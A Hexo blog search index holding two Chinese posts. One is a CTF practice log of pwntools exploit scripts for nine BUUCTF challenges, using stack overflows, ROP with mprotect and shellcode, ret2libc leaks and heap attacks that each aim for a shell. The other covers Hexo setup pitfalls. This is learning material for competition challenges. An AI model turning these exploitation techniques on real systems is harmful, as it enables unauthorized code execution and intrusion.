<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuctf pwn的刷题之旅（长期更）</title>
      <link href="/2019/10/04/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/"/>
      <url>/2019/10/04/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>在身边人的推荐下，我也踏入了buu的刷题之旅，怀着一丢丢激动，还有些许不安（毕竟菜），在这里记录一下自己的刷题经历</p><p><strong>1.warmup_csaw_2016</strong></p><p>from pwn import *<br>sh =remote(‘pwn.buuoj.cn’,20035)<br>#sh = process(‘./warmup_csaw_2016’)<br>#elf = ELF(‘./warmup_casw_2016’)<br>libc = ELF(‘x64_libc.so.6’)</p><p>sh.recvuntil(‘&gt;’)<br>payload = ‘a’*0x48<br>payload += p64(0x40060d)<br>sh.sendline(payload)<br>sh.interactive()</p><p><strong>2.pwn1_sctf_2016</strong></p><p>from pwn import *</p><p>#sh = process(‘./pwn1_sctf_2016’)<br>sh = remote (‘pwn.buuoj.cn’,20086)<br>payload = ‘I’*19 + “a” * 7 + p32(0x08048F0D)<br>sh.sendline(payload)<br>sh.interactive()</p><p><strong>3.not_the_same_3dsctf_2016</strong></p><p>这题，利用mrotect，修改了可执行区域</p><p>from pwn import *</p><p>#sh = process(‘./not_the_same_3dsctf_2016’)<br>sh = remote (‘pwn.buuoj.cn’,20007)<br>elf = ELF(‘./not_the_same_3dsctf_2016’)<br>#libc = ELF(‘x86_libc.so.6’)<br>pop2 = 0x0806fcc9<br>pop3 = 0x0809e3e5</p><p>payload = ‘a’*0x2D + p32(elf.symbols[‘mprotect’])<br>payload += p32(pop3) + p32(0x080EB000) + p32(0x3000)<br>payload += p32(7) + p32(elf.symbols[‘read’])<br>payload += p32(pop3) + p32(0) + p32(0x080EBF80) + p32(0x200) + p32(0x080EBF80)<br>sh.sendline(payload)<br>sleep(0.5)<br>sh.sendline(asm(shellcraft.sh()))<br>sh.interactive()</p><p><strong>4.get_started_3dsctf_2016</strong><br>这题的思路呢，和上面not_the_same_3dsctf_2016类似</p><p>from pwn import *<br>context.arch = “i386”<br>context.log_level = “debug”<br>#sh = process(“./get_started_3dsctf_2016”)<br>sh = remote(“pwn.buuoj.cn”,20004)<br>elf = ELF(“get_started_3dsctf_2016”)<br>pop2_ret = 0x0809a7dc<br>pop3_ret = 0x0804f460<br>payload = ‘a’ * 56 + p32(elf.symbols[‘mprotect’]) + p32(pop3_ret) + p32(0x080EB000) + p32(0x3000) + p32(7) + p32(elf.symbols[‘read’]) + p32(pop3_ret) + p32(0) + p32(0x080EBF80) + p32(0x200) + p32(0x080EBF80)<br>sh.sendline(payload)<br>#sleep(1)<br>#input()<br>sh.sendline(asm(shellcraft.sh()))<br>sh.interactive()</p><p><strong>5.ciscn_2019_n_1</strong></p><p>from pwn import *<br>pop_rdi_ret = 0x400793<br>bss = 0x0000000000601050<br>elf = ELF(“ciscn_2019_n_1”)<br>sh = remote(‘pwn.buuoj.cn’,20137)</p><p>payload = ‘a’*56<br>payload += p64(pop_rdi_ret)+p64(bss)+p64(elf.plt[‘gets’])<br>payload += p64(pop_rdi_ret)+p64(bss)+p64(elf.plt[‘system’])<br>sh.sendline(payload)<br>sh.send(‘/bin/sh\x00’)<br>sh.interactive()</p><p><strong>6.ciscn_2019_en_2</strong></p><p>from pwn import *<br>context.log_level = ‘debug’</p><p>#sh = process(‘./ciscn_2019_en_2’)<br>sh = remote (‘pwn.buuoj.cn’,20123)<br>elf = ELF(‘ciscn_2019_en_2’)<br>libc = ELF(‘./x64_libc.so.6’)<br>pop_rdi = 0x0000000000400c83<br>main_addr = 0x0000000000400B28<br>###################leak ####################<br>sh.sendlineafter(‘!\n’,’1’)<br>payload = ‘a’<em>0x58<br>payload += p64(pop_rdi) + p64(elf.got[‘puts’]) + p64(elf.plt[‘puts’]) + p64(main_addr)<br>sh.sendline(payload)<br>sh.recvuntil(‘\x0a’)<br>sh.recvuntil(‘\x0a’)<br>sh.recvuntil(‘\x0a’)<br>puts_addr = u64(sh.recv(6).ljust(8,’\x00’))<br>log.success(‘puts_addr=’+hex(puts_addr))<br>libc_base = puts_addr - libc.symbols[‘puts’]<br>system_addr = libc_base + libc.symbols[‘system’]<br>binsh = libc_base + libc.search(‘/bin/sh’).next()<br>#########################  shell #############<br>sh.sendlineafter(‘!\n’,’1’)<br>payload = ‘a’</em>0x58<br>payload += p64(pop_rdi) + p64(binsh) + p64(system_addr)<br>sh.sendline(payload)<br>sh.interactive()</p><p><strong>7.ciscn_2019_c_1</strong></p><p>from pwn import *<br>context.log_level = ‘debug’</p><p>#sh = process(‘./ciscn_2019_c_1’)<br>sh = remote (‘pwn.buuoj.cn’,20115)<br>elf = ELF(‘./ciscn_2019_c_1’)<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)<br>libc = ELF(“x64_libc.so.6”)</p><p>pop_rdi = 0x0000000000400c83</p><p>sh.recvuntil(‘!’)<br>sh.sendline(‘1’)<br>sh.recvuntil(“Input your Plaintext to be encrypted\n”)<br>payload = ‘a’*(0x50+0x08)<br>payload += p64(pop_rdi) + p64(elf.got[‘puts’])+p64(elf.plt[‘puts’])+p64(elf.symbols[‘main’])<br>sh.sendline(payload)<br>sh.recvuntil(‘\n’)<br>sh.recvuntil(‘\n’)<br>puts_addr = u64(sh.recv(6).ljust(8,’\x00’))<br>print ‘puts_addr=’+hex(puts_addr)<br>libc_addr = puts_addr - libc.symbols[‘puts’]<br>system = libc_addr + libc.symbols[‘system’]<br>binsh = libc_addr + libc.search(“/bin/sh\x00”).next()<br>sh.sendline(“1”)<br>sh.recvuntil(“Input your Plaintext to be encrypted\n”)<br>payload  = “\x00” * (0x50 + 0x8)<br>payload += p64(pop_rdi) + p64(binsh) + p64(system)<br>sh.sendline(payload)<br>sh.interactive()</p><p><strong>8.babyheap_0ctf_2017</strong><br>这题的漏洞点呢，主要在edit的size由你自己决定又因为delete进行了0操作，所以得通过fake，讲一个堆块的指针指到unsoted bin堆块的地方进行读取</p><p>from pwn import *<br>#sh = remote(‘pwn.buuoj.cn’,20001)<br>sh = process(‘./babyheap_0ctf_2017’)<br>context.log_level = “debug”<br>elf = ELF(“babyheap_0ctf_2017”)<br>libc = ELF(“x64_libc.so.6”)<br>#libc = ELF(“libc-2.23.so”)</p><p>def add(size):<br>    sh.recvuntil(“Command: “)<br>    sh.sendline(“1”)<br>    sh.recvuntil(“Size: “)<br>    sh.sendline(str(size))</p><p>def edit(idx,size,content):<br>    sh.recvuntil(“Command: “)<br>    sh.sendline(“2”)<br>    sh.recvuntil(“Index: “)<br>    sh.sendline(str(idx))<br>    sh.recvuntil(“Size: “)<br>    sh.sendline(str(size))<br>    sh.recvuntil(“Content: “)<br>    sh.send(content)</p><p>def delete(idx):<br>    sh.recvuntil(“Command: “)<br>    sh.sendline(“3”)<br>    sh.sendline(str(idx))</p><p>def dump(idx):<br>    sh.recvuntil(“Command: “)<br>    sh.sendline(“4”)<br>    sh.recvuntil(“Index: “)<br>    sh.sendline(str(idx))<br>#################### leak libc_base + malloc_hook####<br>add(0x10)<br>add(0x10)<br>add(0x10)<br>add(0x10)<br>add(0x80)<br>delete(1)<br>delete(2)<br>payload = p64(0)<em>3 + p64(0x21) + p64(0)</em>3 + p64(0x21) + p8(0x80)<br>edit(0,len(payload),payload)<br>payload = p64(0)<em>3 + p64(0x21)<br>edit(3,len(payload),payload)<br>add(0x10)<br>add(0x10)<br>payload = p64(0)</em>3 + p64(0x91)<br>edit(3,len(payload),payload)<br>add(0x80)<br>delete(4)<br>dump(2)<br>sh.recvuntil(“Content: \n”)<br>libc_base = u64(sh.recv(8))-0x3c4b78<br>malloc_hook = libc_base + libc.symbols[‘__malloc_hook’]<br>log.success(‘libc_base=’ + hex(libc_base))<br>log.success(‘malloc_hook =’ + hex (malloc_hook))<br>gdb.attach(sh)<br>##################<br>add(0x60) #malloc to malloc_hook nearby<br>delete(4) #allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4</p><p>// edit idx4’s fd point to fake chunk<br>payload = p64(malloc_hook - 35)<br>edit(2,len(payload),payload)<br>add(0x60)<br>add(0x60)<br>one_gadget = 0x4526a<br>payload = p8(0) * 3 + p64(0) * 2 + p64(libc_base + one_gadget)<br>edit(6,len(payload),payload)</p><p><strong>9.babyfengshui_33c3_2016</strong></p><p>from pwn import *<br>context.log_level = ‘debug’<br>#sh = process(‘./babyfengshui_33c3_2016’)<br>sh = remote(‘pwn.buuoj.cn’,20002)<br>elf = ELF(“babyfengshui_33c3_2016”)<br>libc = ELF(“x86_libc.so.6”)</p><p>def add(name_size,name,text_size,text):<br>    sh.recvuntil(“Action: “)<br>    sh.sendline(“0”)<br>    sh.recvuntil(“size of description: “)<br>    sh.sendline(str(name_size))<br>    sh.recvuntil(“name: “)<br>    sh.sendline(name)<br>    sh.recvuntil(“text length: “)<br>    sh.sendline(str(text_size))<br>    sh.recvuntil(“text:”)<br>    sh.sendline(text)</p><p>def show(idx):<br>    sh.recvuntil(“Action: “)<br>    sh.sendline(“2”)<br>    sh.recvuntil(“index: “)<br>    sh.sendline(str(idx))</p><p>def edit(idx,text,size):<br>    sh.recvuntil(“Action: “)<br>    sh.sendline(“3”)<br>    sh.recvuntil(“index: “)<br>    sh.sendline(str(idx))<br>    sh.recvuntil(“text length: “)<br>    sh.sendline(str(size))<br>    sh.recvuntil(“text: “)<br>    sh.sendline(text)</p><p>def delete(idx):<br>    sh.recvuntil(“Action: “)<br>    sh.sendline(“1”)<br>    sh.recvuntil(“index: “)<br>    sh.sendline(str(idx))</p><p>add(0x80,’\x11\n’,0x80,’\x12\n’)#idx 0<br>add(0x10,’\x13\n’,0x10,”\x14\n”)<br>add(0x10,’\x15\x15’,0x10,’\x16\x16’)<br>add(0x10,’/bin/sh\x00’,0x10,”/bin/sh\x00”)<br>#gdb.attach(sh)<br>delete(0)<br>#gdb.attach(sh)<br>add(0x100,’\x17\n’,0x160,0x128 * ‘a’ + p32(elf.got[‘free’]))<br>#gdb.attach(sh)<br>show(1)<br>sh.recvuntil(“description: “)<br>libc_base = u32(sh.recv(4)) - libc.symbols[‘free’]<br>system_addr = libc.symbols[‘system’] + libc_base<br>log.success(“libc: “ + hex(libc_base))<br>log.success(“system_addr:” + hex(system_addr))<br>edit(1,p32(system_addr),0x4)<br>delete(3)<br>sh.interactive()</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客的一些坑</title>
      <link href="/2019/10/04/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/"/>
      <url>/2019/10/04/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>根据此链接进行博客的搭建<a href="https://blog.csdn.net/weixin_39879178/article/details/80319392" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39879178/article/details/80319392</a><br>但是其中踩了不少的坑，发现此链接中有些图片存在些许问题</p><p><strong>1.在进行hexo init的时候</strong><br><img src="https://img-blog.csdnimg.cn/20191003223041562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poel9fX18=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>实际上，你不应该在根目录进行hexo init操作，而是应该进入你的blog/Hexo文件里进行 hexo init操作。<br>不然，你就会出现hexo no found。</p><p><strong>2.在进行添加分类链接的时候</strong><br>网上很多博客都是直接让你new page一个categories，但是请注意！！！！！<br><img src="https://img-blog.csdnimg.cn/20191003223424930.png" alt="在这里插入图片描述"><br>先观察你的github文件夹里categories里的大小写，根据大小写来修改D:\blog\Hexo\themes\next里的_config.yml文件夹里的categories选项。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
